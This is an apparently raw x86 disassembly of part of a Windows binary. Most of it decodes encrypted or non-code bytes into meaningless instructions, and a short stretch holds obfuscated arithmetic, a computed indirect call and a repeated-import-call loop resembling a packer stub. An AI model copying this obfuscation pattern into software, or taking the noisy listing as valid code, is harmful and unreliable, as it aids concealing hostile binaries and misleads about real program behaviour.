  408bce:	sbb    al,BYTE PTR [edi]
  408bd0:	mov    dl,BYTE PTR ds:0x82b6bf05
  408bd6:	add    eax,0x2d3ccf48
  408bdb:	(bad)  
  408bdc:	mov    dl,0x7f
  408bde:	jae    0x408c11
  408be0:	xlat   BYTE PTR ds:[ebx]
  408be1:	fdiv   QWORD PTR [edi-0x25]
  408be4:	mov    edi,0x6ed14747
  408be9:	icebp  
  408bea:	sbb    al,al
  408bec:	mov    WORD PTR [edi],?
  408bee:	adc    DWORD PTR [ebp+0x1aecf8f1],ebp
  408bf4:	popf   
  408bf5:	(bad)  
  408bf7:	cld    
  408bf8:	stc    
  408bf9:	add    BYTE PTR [ebp+ebp*1+0x19],0x89
  408bfe:	xchg   edi,eax
  408bff:	pusha  
  408c00:	cmp    esp,ebx
  408c02:	inc    ecx
  408c03:	ins    DWORD PTR es:[edi],dx
  408c04:	std    
  408c05:	cs add eax,0x544d69a7
  408c0b:	rcr    BYTE PTR [edi-0x2e],cl
  408c0e:	aad    0x59
  408c10:	je     0x408ba8
  408c12:	mov    al,ds:0xc6eb64a1
  408c17:	ret    0xb34c
  408c1a:	cmp    al,0xe8
  408c1c:	shr    BYTE PTR [edi+ecx*2+0x35],1
  408c20:	arpl   WORD PTR [edi+edx*1+0x7c0713bd],bp
  408c27:	bound  esi,QWORD PTR [edx]
  408c29:	cwde   
  408c2a:	adc    ecx,DWORD PTR [edi]
  408c2c:	es pop ds
  408c2e:	mov    dl,0x78
  408c30:	mov    cs,ecx
  408c32:	jo     0x408c09
  408c34:	cmp    ch,bl
  408c36:	cmp    eax,DWORD PTR [esi+0x7f9e62b5]
  408c3c:	mov    BYTE PTR [esi+eax*1-0x38],0x49
  408c41:	loop   0x408c13
  408c43:	push   esi
  408c44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c45:	inc    eax
  408c46:	adc    DWORD PTR [edx-0x32],esp
  408c49:	mov    eax,0x2ef5b205
  408c4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c4f:	inc    edx
  408c50:	stos   BYTE PTR es:[edi],al
  408c51:	stc    
  408c52:	cmp    esi,DWORD PTR [esi-0x56f29332]
  408c58:	daa    
  408c59:	push   0xffffff8d
  408c5b:	pop    ds
  408c5c:	mov    bl,0x8b
  408c5e:	or     al,BYTE PTR [edx-0x6b400860]
  408c64:	cmp    al,0x5d
  408c66:	and    al,0xad
  408c68:	cs retf 0xf04d
  408c6c:	mov    al,0xd4
  408c6e:	adc    ebx,DWORD PTR [ebp+0x1833bdbe]
  408c74:	adc    al,0xa4
  408c76:	sbb    dh,BYTE PTR [ebx+0x6e27e1af]
  408c7c:	stos   DWORD PTR es:[edi],eax
  408c7d:	cld    
  408c7e:	dec    eax
  408c7f:	shl    BYTE PTR ds:0x7c40ba23,1
  408c85:	pop    ds
  408c86:	(bad)  
  408c88:	gs xor al,0x2a
  408c8b:	inc    ebx
  408c8c:	push   ebp
  408c8d:	ds clc 
  408c8f:	pop    ss
  408c90:	jl     0x408d0f
  408c92:	sbb    al,ch
  408c94:	loopne 0x408d06
  408c96:	xchg   esi,eax
  408c97:	mov    ebx,0xcb23d4d6
  408c9c:	mov    ds:0xf33eb1dc,eax
  408ca1:	mov    ebx,0x5427928b
  408ca6:	dec    ecx
  408ca7:	jmp    0x408cd1
  408ca9:	stos   DWORD PTR es:[edi],eax
  408caa:	push   ebp
  408cab:	adc    al,0x44
  408cad:	pop    ebx
  408cae:	in     eax,0x14
  408cb0:	stos   BYTE PTR es:[edi],al
  408cb1:	push   edi
  408cb2:	in     al,dx
  408cb3:	or     BYTE PTR [ebx-0x1a5a8acd],bh
  408cb9:	inc    eax
  408cba:	sub    dh,BYTE PTR [edi]
  408cbc:	retf   0x291c
  408cbf:	loopne 0x408c6e
  408cc1:	xchg   ebp,eax
  408cc2:	inc    edi
  408cc3:	fwait
  408cc4:	out    dx,eax
  408cc5:	into   
  408cc6:	cmp    al,BYTE PTR [ecx+0x735684a2]
  408ccc:	inc    edi
  408ccd:	test   BYTE PTR [edi+0x507544d8],bl
  408cd3:	dec    esp
  408cd4:	pusha  
  408cd5:	sbb    ebx,DWORD PTR [ebx]
  408cd7:	sbb    cl,BYTE PTR cs:[edi+0x62]
  408cdb:	sub    BYTE PTR [ecx-0x2d1d5d86],0x50
  408ce2:	pop    es
  408ce3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ce4:	pop    esp
  408ce5:	mov    eax,0x7a0d093d
  408cea:	push   esp
  408ceb:	popa   
  408cec:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  408cee:	or     DWORD PTR [edx+0x7b],ebx
  408cf1:	jbe    0x408cc9
  408cf3:	lock (bad) 
  408cf5:	mov    edx,0x300bd497
  408cfa:	in     eax,dx
  408cfb:	cmc    
  408cfc:	xlat   BYTE PTR ds:[ebx]
  408cfd:	sbb    al,0x98
  408cff:	popf   
  408d00:	pop    ebp
  408d01:	adc    cl,cl
  408d03:	push   edx
  408d04:	jne    0x40694b
  408d0a:	mov    eax,esi
  408d0c:	jmp    0x408d16
  408d11:	mov    eax,0x3272db
  408d16:	mov    ebx,0x7510893
  408d1b:	mov    ecx,DWORD PTR [ebp-0x4]
  408d1e:	xor    ecx,ebx
  408d20:	add    ecx,eax
  408d22:	mov    DWORD PTR [ebp-0xc],ecx
  408d25:	mov    ebx,0x65655
  408d2a:	add    ebx,0x3234
  408d30:	xchg   ebx,esi
  408d32:	xor    ebx,ebx
  408d34:	push   esi
  408d35:	mov    esi,ebx
  408d37:	pop    ebx
  408d38:	mov    edx,esi
  408d3a:	add    ebx,0x1002
  408d40:	lea    eax,[ebp-0x10]
  408d43:	add    edx,eax
  408d45:	add    edx,0x5
  408d48:	push   edx
  408d49:	inc    esi
  408d4a:	pop    ecx
  408d4b:	dec    ecx
  408d4c:	xchg   ecx,eax
  408d4d:	dec    eax
  408d4e:	xchg   ecx,eax
  408d4f:	dec    ecx
  408d50:	xchg   ecx,edx
  408d52:	dec    edx
  408d53:	push   edx
  408d54:	mov    edx,ebx
  408d56:	pop    ebx
  408d57:	dec    ebx
  408d58:	call   DWORD PTR [ebx]
  408d5a:	cmp    DWORD PTR [ebp+0x10],esi
  408d5d:	je     0x408d7c
  408d63:	xchg   edx,eax
  408d64:	push   0xb
  408d66:	pop    ecx
  408d67:	push   0x4
  408d69:	pop    ebx
  408d6a:	inc    ebx
  408d6b:	xchg   ebx,ecx
  408d6d:	sub    ebx,ecx
  408d6f:	xchg   ebx,ecx
  408d71:	dec    ecx
  408d72:	dec    ecx
  408d73:	mov    eax,DWORD PTR [ebp-0x1c]
  408d76:	imul   eax,ecx
  408d79:	add    esp,eax
  408d7b:	xchg   edx,eax
  408d7c:	push   eax
  408d7d:	xor    ebx,ebx
  408d7f:	mov    edx,esp
  408d81:	dec    edx
  408d82:	inc    ebx
  408d83:	add    ebx,DWORD PTR [edx+ebx*1]
  408d86:	dec    ebx
  408d87:	xor    edx,edx
  408d89:	add    DWORD PTR [ebp-0xc],ebx
  408d8c:	pop    ebx
  408d8d:	mov    eax,DWORD PTR [ebp-0xc]
  408d90:	pop    edi
  408d91:	pop    esi
  408d92:	pop    ebx
  408d93:	leave  
  408d94:	ret    0x10
  408d97:	push   ebp
  408d98:	mov    ebp,esp
  408d9a:	push   ecx
  408d9b:	xor    ecx,ecx
  408d9d:	xor    ecx,DWORD PTR ds:0x42600c
  408da3:	and    DWORD PTR ds:0x426014,ecx
  408da9:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  408db0:	mov    eax,DWORD PTR [ebp-0x4]
  408db3:	sub    edx,edx
  408db5:	mov    edx,DWORD PTR [ebp+0x10]
  408db8:	and    DWORD PTR ds:0x427014,ebx
  408dbe:	mov    ecx,0x7510893
  408dc3:	xor    eax,ecx
  408dc5:	add    eax,0x3272db
  408dca:	mov    DWORD PTR [edx],eax
  408dcc:	mov    DWORD PTR ds:0x426008,0x4f8c
  408dd6:	mov    eax,DWORD PTR [ebp+0xc]
  408dd9:	sbb    DWORD PTR ds:0x425020,0x2880
  408de3:	xor    eax,ecx
  408de5:	and    DWORD PTR ds:0x429008,0x0
  408def:	mov    edx,DWORD PTR ds:0x429008
  408df5:	inc    edx
  408df6:	mov    DWORD PTR ds:0x429008,edx
  408dfc:	cmp    DWORD PTR ds:0x429008,0x17
  408e03:	jne    0x408e19
  408e09:	push   0x41ffb1
  408e0e:	push   0x391b
  408e13:	call   DWORD PTR ds:0x421008
  408e19:	cmp    DWORD PTR ds:0x429008,0x15
  408e20:	jb     0x408def
  408e26:	xor    DWORD PTR ds:0x42700c,edi
  408e2c:	push   esi
  408e2d:	mov    esi,DWORD PTR [ebp+0x10]
  408e30:	mov    edx,0x3272db
  408e35:	add    eax,edx
  408e37:	mov    DWORD PTR [esi+0x4],eax
  408e3a:	mov    eax,DWORD PTR [ebp+0x14]
  408e3d:	mov    esi,DWORD PTR [ebp+0x10]
  408e40:	mov    DWORD PTR [esi+0x8],eax
  408e43:	jmp    0x40b197
  408e48:	push   ebp
  408e49:	add    al,0x4c
  408e4b:	mov    al,ds:0x6365b8eb
  408e50:	add    eax,0x4c3327cf
  408e55:	cmp    dh,al
  408e57:	test   DWORD PTR [edx+0x2b626219],0x8c62625f
  408e61:	ds das 
  408e63:	cld    
  408e64:	call   0x1717:0x5a826cfa
  408e6b:	push   ss
  408e6c:	mul    edx
  408e6e:	push   cs
  408e6f:	xchg   esi,eax
  408e70:	cs or  al,0xdc
  408e73:	mov    eax,ds:0xf11213b0
  408e78:	and    DWORD PTR [esi+0x2c94884a],0x73
  408e7f:	mov    esp,0x6890040e
  408e84:	cmp    BYTE PTR [edi-0x7fdb1c22],al
  408e8a:	xchg   ecx,eax
  408e8b:	fidiv  DWORD PTR [edi-0x4]
  408e8e:	adc    eax,0x329c442c
  408e93:	inc    eax
  408e94:	sbb    al,0x72
  408e96:	xor    al,BYTE PTR [ecx-0x29]
  408e99:	stos   BYTE PTR es:[edi],al
  408e9a:	and    bh,BYTE PTR [eax-0x1932c5c8]
  408ea0:	mov    fs,WORD PTR ds:0xeecbb5ac
  408ea6:	and    BYTE PTR [edi+0x10f6eaae],dh
  408eac:	inc    esp
  408ead:	sbb    BYTE PTR [eax],0x16
  408eb0:	stc    
  408eb1:	xchg   ebx,eax
  408eb2:	sub    ah,dh
  408eb4:	xor    ch,BYTE PTR [esi-0x59]
  408eb7:	retf   
  408eb8:	shl    DWORD PTR [ecx-0x11],0x46
  408ebc:	lds    esp,FWORD PTR [eax]
  408ebe:	mov    ecx,0x67943872
  408ec3:	fisttp DWORD PTR [ebx-0x4634cc0f]
  408ec9:	cmp    bh,BYTE PTR [eax]
  408ecb:	data16 mov BYTE PTR [edi-0x8],ch
  408ecf:	xlat   BYTE PTR ds:[ebx]
  408ed0:	push   0xf439cd4
  408ed5:	pop    es
  408ed6:	popf   
  408ed7:	pop    edx
  408ed8:	or     BYTE PTR [ecx-0x7b4fedab],cl
  408ede:	sahf   
  408edf:	in     eax,dx
  408ee0:	mov    ds:0xd602fa26,al
  408ee5:	test   eax,0x8bdc6ff3
  408eea:	mov    ah,ch
  408eec:	arpl   bp,bp
  408eee:	int    0x4b
  408ef0:	push   0x39
  408ef2:	std    
  408ef3:	ss mov ah,0x61
  408ef6:	test   DWORD PTR [edx],edi
  408ef8:	lods   eax,DWORD PTR ds:[esi]
  408ef9:	scas   eax,DWORD PTR es:[edi]
  408efa:	add    bl,BYTE PTR [ebx]
  408efc:	xor    eax,0x4b765adf
  408f01:	in     al,0xfd
  408f03:	mov    ebx,0x27647947
  408f08:	daa    
  408f09:	jo     0x408ef4
  408f0b:	ror    DWORD PTR [esi],1
  408f0d:	ins    BYTE PTR es:[edi],dx
  408f0e:	pop    es
  408f0f:	push   ecx
  408f10:	lock fistp WORD PTR [edi]
  408f13:	test   al,0x2e
  408f15:	jmp    0x408f2e
  408f17:	lea    eax,[ecx+0x71a0bb4c]
  408f1d:	mov    ebp,0x50022ac4
  408f22:	iret   
  408f23:	or     al,BYTE PTR [edi-0x3b4f04]
  408f29:	shr    BYTE PTR gs:[eax],cl
  408f2c:	inc    edi
  408f2d:	pusha  
  408f2e:	mov    DWORD PTR [edi+eax*2+0x35f88b72],esp
  408f35:	rcr    DWORD PTR [edi+ecx*4],0x87
  408f39:	in     al,0xb
  408f3b:	pop    ds
  408f3c:	push   eax
  408f3d:	xchg   edi,eax
  408f3e:	rcr    DWORD PTR [esi],0x26
  408f41:	fmul   st,st(1)
  408f43:	inc    edi
  408f44:	dec    ebx
  408f45:	mov    ds:0x39feec7e,al
  408f4a:	aaa    
  408f4b:	add    al,0x56
  408f4d:	lea    esi,[edi+0x5f]
  408f50:	ret    
  408f51:	mov    dl,0x91
  408f53:	inc    edx
  408f54:	imul   esi,DWORD PTR [edx],0xfffffffb
  408f57:	sbb    eax,0x6943aaec
  408f5c:	jg     0x408ef2
  408f5e:	je     0x408f21
  408f60:	inc    eax
  408f61:	out    dx,eax
  408f62:	mov    ecx,0xffa337d1
  408f67:	pop    ebp
  408f68:	(bad)  
  408f69:	mov    edi,0xbd60e6f1
  408f6e:	(bad)  
  408f6f:	cld    
  408f70:	xor    BYTE PTR [ecx+ebp*8-0x26],ah
  408f74:	sub    eax,0x309f600b
  408f79:	adc    edx,DWORD PTR [eax-0xfdd16dc]
  408f7f:	shr    BYTE PTR [ecx],cl
  408f81:	xchg   DWORD PTR [ecx-0x48362193],ebx
  408f87:	int    0xef
  408f89:	pop    es
  408f8a:	fs push ds
  408f8c:	mov    dl,0xb8
  408f8e:	jno    0x408f51
  408f90:	push   ecx
  408f91:	push   0x77
  408f93:	mov    dl,0xdd
  408f95:	scas   al,BYTE PTR es:[edi]
  408f96:	sar    DWORD PTR [ebp+0x2d18163d],0x48
  408f9d:	lods   al,BYTE PTR ds:[esi]
  408f9e:	and    al,0xb8
  408fa0:	add    eax,0x5c6f3716
  408fa5:	(bad)  
  408fa7:	xor    cl,BYTE PTR [eax+ecx*2+0x31]
  408fab:	js     0x408fc5
  408fad:	push   edx
  408fae:	adc    DWORD PTR [edi],ebp
  408fb0:	fs push esi
  408fb2:	and    eax,0xcd67de4c
  408fb7:	les    esi,FWORD PTR [edx]
  408fb9:	into   
  408fba:	mov    DWORD PTR ds:[esi-0x55],edx
  408fbe:	hlt    
  408fbf:	pop    esi
  408fc0:	fld    TBYTE PTR [eax+0x2a]
  408fc3:	cmp    ebx,0x66
  408fc6:	xlat   BYTE PTR ds:[ebx]
  408fc7:	imul   edx,ecx,0xffffff82
  408fca:	adc    dh,al
  408fcc:	int3   
  408fcd:	pop    edx
  408fce:	push   cs
  408fcf:	aas    
  408fd0:	(bad)
  408fd3:	outs   dx,DWORD PTR ds:[esi]
  408fd4:	pop    ebp
  408fd5:	addr16 nop
  408fd7:	cmp    BYTE PTR [edx],dl
  408fd9:	pushf  
  408fda:	add    eax,0x68497ff5
  408fdf:	stos   DWORD PTR es:[edi],eax
  408fe0:	jns    0x409059
  408fe2:	sbb    eax,0xdca16745
  408fe7:	(bad)  
  408fe8:	adc    cl,BYTE PTR [esi+0x6eee58b3]
  408fee:	icebp  
  408fef:	cmp    bh,BYTE PTR [esi]
  408ff1:	int    0x72
  408ff3:	ror    edx,cl
  408ff5:	push   0x42
  408ff7:	inc    ecx
  408ff8:	cmp    BYTE PTR [eax+0x3965807],cl
  408ffe:	sub    bh,BYTE PTR [edi]
  409000:	xchg   ebp,eax
  409001:	and    BYTE PTR [edi-0xa],ah
  409004:	add    eax,0x6701237d
  409009:	sar    esi,cl
  40900b:	mov    edx,0xa4e932b8
  409010:	sub    dl,BYTE PTR [edi-0x4114a9d8]
  409016:	inc    esp
  409017:	scas   eax,DWORD PTR es:[edi]
  409018:	lea    edi,[eax-0x64]
  40901b:	ss jne 0x408fb4
  40901e:	lds    ebx,FWORD PTR [edi+0xb]
  409021:	leave  
  409022:	or     eax,0xd1e2ac9e
  409027:	xchg   ebx,eax
  409028:	test   al,0xbc
  40902a:	arpl   WORD PTR [edx-0x6c],bx
  40902d:	mov    ebp,0x7b9c860b
  409032:	xlat   BYTE PTR ds:[ebx]
  409033:	dec    DWORD PTR [eax]
  409035:	popa   
  409036:	push   es
  409037:	mov    al,0xd0
  409039:	and    eax,0xc935020
  40903e:	mov    ah,0xae
  409040:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409041:	out    dx,eax
  409042:	mov    al,ds:0x2d1664f6
  409047:	(bad)  
  409049:	xchg   BYTE PTR [esi-0x59],dh
  40904c:	jl     0x4090c7
  40904e:	mov    esp,0xebd892f8
  409053:	adc    al,0x2
  409055:	cld    
  409056:	mov    esi,0x539547e5
  40905b:	loope  0x408fdf
  40905d:	popf   
  40905e:	in     al,0x28
  409060:	ds push esi
  409062:	jne    0x40901c
  409064:	xor    BYTE PTR [edx+0x4],bh
  409067:	fadd   DWORD PTR [esi-0x2]
  40906a:	int    0x4c
  40906c:	out    0x43,eax
  40906e:	dec    edi
  40906f:	push   esp
  409070:	loop   0x409071
  409072:	pop    ds
  409073:	(bad)  
  409074:	sub    dh,dl
  409076:	adc    ecx,ecx
  409078:	stos   BYTE PTR es:[edi],al
  409079:	or     ebp,ebx
  40907b:	es inc eax
  40907d:	test   eax,0x56c2be28
  409082:	mov    edi,0xab68c013
  409087:	ret    0xb56d
  40908a:	iret   
  40908b:	mov    al,0x22
  40908d:	ret    0x2edc
  409090:	pop    ss
  409091:	xchg   ecx,eax
  409092:	xchg   edx,eax
  409093:	cdq    
  409094:	jne    0x409018
  409096:	jecxz  0x40906c
  409098:	sbb    DWORD PTR [eax-0x44],esp
  40909b:	push   ds
  40909c:	jg     0x4090ab
  40909e:	push   ecx
  40909f:	retf   0x8832
  4090a2:	mov    ebp,0x74584950
  4090a7:	mov    ?,WORD PTR [esi]
  4090a9:	xchg   DWORD PTR [eax+0x4d25d1f3],ebx
  4090af:	cmc    
  4090b0:	and    BYTE PTR [eax-0x55f5e31c],al
  4090b6:	push   cs
  4090b7:	inc    ebx
  4090b8:	sub    eax,0x142ac758
  4090bd:	jbe    0x409129
  4090bf:	lods   al,BYTE PTR ds:[esi]
  4090c0:	std    
  4090c1:	push   ebx
  4090c2:	stos   DWORD PTR es:[edi],eax
  4090c3:	sbb    cl,BYTE PTR [ecx+ebx*2]
  4090c6:	sbb    eax,0x902fba06
  4090cb:	clc    
  4090cc:	pop    ecx
  4090cd:	sbb    esi,0x9e4c6b0
  4090d3:	cmp    al,0xeb
  4090d6:	ss sub al,0x61
  4090d9:	call   0xcb58822d
  4090de:	cs js  0x4090c4
  4090e1:	sub    ch,BYTE PTR [ecx-0x4d]
  4090e4:	loope  0x40911c
  4090e6:	nop
  4090e7:	cmp    al,0x9d
  4090e9:	nop
  4090ea:	mov    bl,0x8f
  4090ec:	out    0x49,eax
  4090ee:	push   es
  4090ef:	shr    edx,0xae
  4090f2:	gs mov edi,0x7d0b4c8f
  4090f8:	in     al,0x2e
  4090fa:	test   BYTE PTR [eax-0x1c],al
  4090fd:	and    bl,0xa1
  409100:	push   cs
  409101:	sbb    dl,BYTE PTR [ecx]
  409103:	mov    ?,edx
  409105:	mov    ecx,0x428dfe0c
  40910a:	sub    al,0xc2
  40910c:	xor    al,0xca
  40910e:	jl     0x409171
  409110:	ret    0xda93
  409113:	pop    esp
  409114:	test   DWORD PTR [eax],ecx
  409116:	inc    esi
  409117:	mov    ch,0xcd
  409119:	push   0x3bd8f557
  40911e:	(bad)  
  40911f:	out    0x18,al
  409121:	mov    ch,0xde
  409123:	mov    ebx,0x4e5b6e1d
  409128:	int    0x1e
  40912a:	fucomp st(4)
  40912c:	shl    DWORD PTR [edx],0x2
  40912f:	clc    
  409130:	xor    DWORD PTR [ebp-0x1652b894],ebp
  409136:	aas    
  409137:	mov    edx,0xdc655f26
  40913c:	call   0x1ddb8c7a
  409141:	sub    al,0x1f
  409143:	daa    
  409144:	add    eax,0x26dfb88c
  409149:	push   0x3fc0c305
  40914e:	push   ecx
  40914f:	and    al,BYTE PTR [ebp-0x4be2c1ae]
  409155:	jnp    0x409131
  409157:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409159:	mov    ebp,0xd86ceab6
  40915e:	fs sbb eax,0x6e4599b2
  409164:	adc    BYTE PTR [esi-0x2d],0xa
  409168:	fsubrp st(0),st
  40916a:	(bad)  
  40916b:	mov    ebp,DWORD PTR [ecx-0x63]
  40916e:	fld    TBYTE PTR [edx]
  409170:	push   ebx
  409171:	iret   
  409172:	sbb    edx,DWORD PTR [eax]
  409174:	dec    esp
  409175:	mov    dl,0xe
  409177:	mov    cl,ah
  409179:	scas   eax,DWORD PTR es:[edi]
  40917a:	jg     0x409170
  40917c:	lea    ax,[eax]
  40917f:	fsubr  DWORD PTR [ecx+0x30]
  409182:	jp     0x4091f6
  409184:	sti    
  409185:	fiadd  DWORD PTR [eax]
  409187:	inc    bh
  409189:	push   es
  40918a:	jmp    0x60e:0xf915d82a
  409191:	call   esi
  409193:	ss dec ecx
  409195:	cmc    
  409196:	mov    ebx,0x2cfbecd9
  40919b:	inc    esp
  40919c:	loope  0x409146
  40919e:	and    DWORD PTR [eax+0x8],ecx
  4091a1:	repz jg 0x409191
  4091a4:	imul   eax,ecx,0xd4bba2e3
  4091aa:	cld    
  4091ab:	sbb    eax,0x787e6a3e
  4091b0:	fld    st(2)
  4091b2:	adc    BYTE PTR [esi-0x7b96a51e],dl
  4091b8:	add    DWORD PTR [eax],0x0
  4091bb:	sti    
  4091bc:	jp     0x4091d6
  4091be:	add    eax,0xb5e36760
  4091c3:	mov    ds:0x2a2cf4e2,al
  4091c8:	inc    edx
  4091c9:	mov    fs,WORD PTR ds:0x7163388e
  4091cf:	aaa    
  4091d0:	xchg   DWORD PTR [eax*2-0x49c8de23],edx
  4091d7:	cmp    al,0x8b
  4091d9:	in     eax,0xa1
  4091db:	add    al,0x3f
  4091dd:	xor    ch,bl
  4091df:	add    edi,DWORD PTR [esi]
  4091e1:	ds push es
  4091e3:	jmp    0xc250:0xe641e611
  4091ea:	pop    esi
  4091eb:	std    
  4091ec:	and    DWORD PTR [eax],esp
  4091ee:	dec    esp
  4091ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091f0:	jp     0x4091cd
  4091f2:	push   ds
  4091f3:	test   eax,0x4cc98ea9
  4091f8:	fcomp  QWORD PTR [edi+0x7c]
  4091fb:	mov    bh,0x70
  4091fd:	ss aas 
  4091ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409200:	popa   
  409201:	pop    esp
  409202:	and    eax,0xb3cfdd02
  409207:	call   0xa9ab9b55
  40920c:	cmp    al,0x9d
  40920e:	sti    
  40920f:	stos   BYTE PTR es:[edi],al
  409210:	ds jb  0x4091ec
  409213:	mov    esp,ebx
  409215:	and    DWORD PTR [ebx+edx*1+0x78f93442],ebx
  40921c:	jecxz  0x4091d0
  40921e:	(bad)  
  409220:	mov    al,0xac
  409222:	or     DWORD PTR ds:0x9c7e1731,edx
  409228:	dec    esp
  409229:	inc    esi
  40922a:	iret   
  40922b:	inc    edi
  40922c:	scas   eax,DWORD PTR es:[edi]
  40922d:	call   0xb5efd521
  409232:	push   ebp
  409233:	popf   
  409234:	sar    BYTE PTR [ecx+esi*8-0x152cbb52],0x1d
  40923c:	jmp    0xfc3e:0x540093b4
  409243:	adc    ch,0x75
  409246:	aas    
  409247:	stos   DWORD PTR es:[edi],eax
  409248:	cmp    al,0x34
  40924a:	jmp    0x581ff2b8
  40924f:	adc    eax,0xcf274cd3
  409254:	sub    edi,ebx
  409256:	pusha  
  409257:	xchg   ebp,eax
  409258:	popa   
  409259:	mov    cl,0xb8
  40925b:	jge    0x409204
  40925d:	mov    ds:0x926539ce,eax
  409262:	(bad)  
  409263:	mov    eax,ds:0xb60e7311
  409268:	shl    DWORD PTR [ecx+edx*1],1
  40926b:	xchg   esi,eax
  40926c:	nop
  40926d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40926e:	shr    BYTE PTR [ebp-0x45],1
  409271:	xchg   ebp,eax
  409272:	test   DWORD PTR [esi-0x1c],ebp
  409275:	ja     0x409218
  409277:	cmp    BYTE PTR fs:[eax+0x58],dl
  40927b:	lods   eax,DWORD PTR ds:[esi]
  40927c:	add    eax,0x53d96f88
  409281:	bound  esp,QWORD PTR [edi+0x5c]
  409284:	cdq    
  409285:	arpl   WORD PTR [ebx-0x5c],cx
  409288:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409289:	inc    eax
  40928a:	fld    QWORD PTR [eax+0x5f469df7]
  409290:	(bad)  
  409291:	in     al,0xaf
  409293:	mov    edx,0xdd37f0e6
  409298:	or     BYTE PTR [ebx-0x3abda529],bh
  40929e:	mov    dh,0x6d
  4092a0:	imul   esi,DWORD PTR cs:[ecx+0x2b1a47b0],0xffffff8d
  4092a8:	adc    BYTE PTR [edx],bh
  4092aa:	push   0x26
  4092ac:	iret   
  4092ad:	sahf   
  4092ae:	sbb    BYTE PTR [edi+eiz*2],0x9d
  4092b2:	dec    ecx
  4092b3:	mov    ds:0xcfe8c376,al
  4092b8:	mov    bh,0x3a
  4092ba:	loopne 0x40930f
  4092bc:	in     eax,dx
  4092bd:	hlt    
  4092be:	inc    edi
  4092bf:	dec    eax
  4092c0:	pop    ss
  4092c1:	pusha  
  4092c2:	push   esi
  4092c3:	sub    cl,0x57
  4092c6:	pop    ebp
  4092c7:	loope  0x409294
  4092c9:	in     al,0x97
  4092cb:	jae    0x4092ab
  4092cd:	and    eax,0x47ff4f96
  4092d2:	mov    esp,0x137978d1
  4092d7:	(bad)  
  4092d9:	clc    
  4092da:	push   edi
  4092db:	and    BYTE PTR [ebp+0x236fac4b],cl
  4092e1:	fdivr  QWORD PTR ds:0xb9f4a16e
  4092e7:	xor    bl,BYTE PTR ds:0x7083ad33
  4092ed:	jno    0x409346
  4092ef:	fisubr WORD PTR [eax+eiz*8-0x77]
  4092f3:	inc    eax
  4092f4:	push   si
  4092f6:	jecxz  0x40928d
  4092f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092f9:	inc    edi
  4092fa:	sbb    BYTE PTR [esi+eiz*2+0x62d7f677],dh
  409301:	mov    bl,0xde
  409303:	add    eax,0x66472a2a
  409308:	mov    ss,WORD PTR [edi+0x6e35f865]
  40930e:	push   es
  40930f:	inc    ebx
  409310:	mov    dl,0xdf
  409312:	stos   DWORD PTR es:[edi],eax
  409313:	jecxz  0x409366
  409315:	inc    esi
  409316:	mov    edi,0x2e0f0659
  40931b:	dec    ebx
  40931c:	aad    0x62
  40931e:	mov    edx,0xfc75453e
  409323:	(bad)  
  409324:	dec    edx
  409325:	mov    esp,DWORD PTR [ecx-0x4c]
  409328:	pop    edi
  409329:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40932a:	sub    eax,0xdd9dbc2d
  40932f:	jp     0x40931e
  409331:	or     eax,0xbd64e456
  409336:	mov    WORD PTR [esi+ebp*2+0x77],gs
  40933a:	or     al,0xd6
  40933c:	aad    0xcc
  40933e:	push   eax
  40933f:	pop    ss
  409340:	adc    DWORD PTR [ebx+eiz*4],ebx
  409343:	jecxz  0x409316
  409345:	mov    bl,0xb6
  409347:	cmc    
  409348:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409349:	and    cl,bh
  40934b:	test   ecx,esi
  40934d:	adc    eax,0x4a7fd5e4
  409352:	jg     0x409385
  409354:	jle    0x409332
  409356:	jnp    0x4093ae
  409358:	call   0xf7ff0260
  40935d:	sbb    DWORD PTR [edx-0x45],0x5e
  409361:	shr    DWORD PTR [ecx+0x75a5e37d],cl
  409367:	lea    ebx,ss:[ebx+0x47b23718]
  40936e:	xor    dl,BYTE PTR [esi+0x3af14de]
  409374:	loopne 0x4093be
  409376:	out    0x2b,al
  409378:	xchg   BYTE PTR [bx-0x7f22],dl
  40937d:	scas   al,BYTE PTR es:[edi]
  40937e:	pop    edx
  40937f:	inc    edi
  409380:	aad    0x16
  409382:	jecxz  0x40931d
  409384:	stos   BYTE PTR es:[edi],al
  409385:	shl    BYTE PTR [eax-0x66],cl
  409388:	(bad)  
  409389:	(bad)  [ecx-0xe]
  40938c:	push   cs
  40938d:	dec    esi
  40938e:	xor    eax,0x8896a72c
  409393:	adc    esp,DWORD PTR [edx-0x59]
  409396:	rcr    DWORD PTR [edx],0xf6
  409399:	popa   
  40939a:	jns    0x4093a7
  40939c:	jno    0x4093d5
  40939e:	sbb    eax,0x28a7a70f
  4093a3:	nop
  4093a4:	sbb    edi,edi
  4093a6:	inc    eax
  4093a7:	mov    ebp,0xe3036fb9
  4093ac:	xor    BYTE PTR [eax+ecx*1-0x54b522b5],0x18
  4093b4:	aam    0x47
  4093b6:	test   al,0xdb
  4093b8:	mov    esi,0x12b913f2
  4093bd:	inc    ebx
  4093be:	aad    0xf2
  4093c0:	mov    ebx,gs
  4093c2:	out    dx,eax
  4093c3:	fst    st(3)
  4093c5:	jge    0x40934a
  4093c7:	enter  0x60d5,0xb3
  4093cb:	sbb    edi,ebx
  4093cd:	xlat   BYTE PTR ds:[ebx]
  4093ce:	mov    ebp,0x14d9ae36
  4093d3:	iret   
  4093d4:	fcomp  DWORD PTR [esi]
  4093d6:	mov    dl,0x6d
  4093d8:	jnp    0x409452
  4093da:	mov    bl,0xcf
  4093dc:	std    
  4093dd:	pop    eax
  4093de:	jg     0x409445
  4093e0:	sbb    BYTE PTR [ecx-0x67],0x69
  4093e4:	or     eax,0x51a13f58
  4093e9:	sbb    ah,BYTE PTR [ebx-0x1f]
